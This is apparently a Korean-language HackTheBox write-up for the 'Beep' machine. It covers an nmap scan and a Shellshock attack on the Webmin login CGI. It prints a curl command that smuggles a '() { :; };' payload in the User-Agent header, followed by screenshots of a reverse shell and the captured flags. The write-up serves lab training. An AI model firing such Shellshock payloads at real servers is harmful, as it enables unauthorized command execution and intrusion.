# Beep - HackTheBox
## Recon
```bash
sudo nmap -p 10000,110,111,143,22,25,3306,4190,443,4445,4559,5038,793,80,993,995 -sC -sV -vv -oA Beep 10.10.10.7
```
<img width="1103" height="431" alt="image" src="https://github.com/user-attachments/assets/974809df-cf2f-4f89-b333-27b214cc6259" />
<img width="1103" height="402" alt="image" src="https://github.com/user-attachments/assets/b02be7b1-c263-4e4c-88bc-e6121bf89913" />
<img width="1103" height="311" alt="image" src="https://github.com/user-attachments/assets/b5037f02-861a-428a-a0ef-3c8d9cb98217" />

- SSH(22)
- SMTP(25)
- HTTP(80)
- POP3(110)
- IMAP(143)
- HTTPS(443)
- MYSQL(3306)
- HTTP(10000)

---
## HTTP(10000)
- 10000번 포트로 접속하면 `https`로 연결을 시도하게 한다.
- `https`로 접속 후 로그인을 시도하면 `session_login.cgi`로 로그인이 시도 된다.
<img width="1100" height="239" alt="image" src="https://github.com/user-attachments/assets/2530988e-f869-4f12-a341-44c656fd668c" />

### SHELLSHOCK
- `cgi`파일의 경우 shellshock 공격을 시도해볼 수 있어서 ping test 시도.
```bash
curl -k -H 'User-Agent: () { :; };ping 10.10.16.4' 'https://10.10.10.7:10000/session_login.cgi'
```
<img width="1103" height="279" alt="image" src="https://github.com/user-attachments/assets/4cd9b80c-7e62-4a5f-b5bf-5daf3ed0416e" />

<br>
<br>

- ping test 성공.
<img width="1103" height="279" alt="image" src="https://github.com/user-attachments/assets/fb6d627f-c727-4bf7-97ed-398a75ad22b4" />

<br>
<br>

- 리버스 셸 연결 시도.
<img width="1103" height="254" alt="image" src="https://github.com/user-attachments/assets/8f80e24b-ffb3-4bfd-9bbf-9b46b4ea4d6c" />

<br>
<br>

- 셸 획득.
<img width="1103" height="139" alt="image" src="https://github.com/user-attachments/assets/5eeaa034-e9e6-4d97-a53f-7b8cffe90962" />

---
## FLAG
- `/home/fanis/user.txt`
<img width="1103" height="174" alt="image" src="https://github.com/user-attachments/assets/162facfe-80a2-4e30-8020-c5698683da34" />

<br>
<br>

- `/root/root.txt`
<img width="1103" height="327" alt="image" src="https://github.com/user-attachments/assets/b746783d-a31c-45a6-9144-791e0a8be8f6" />

---
## Reference
- https://0xdf.gitlab.io/2021/02/23/htb-beep.html









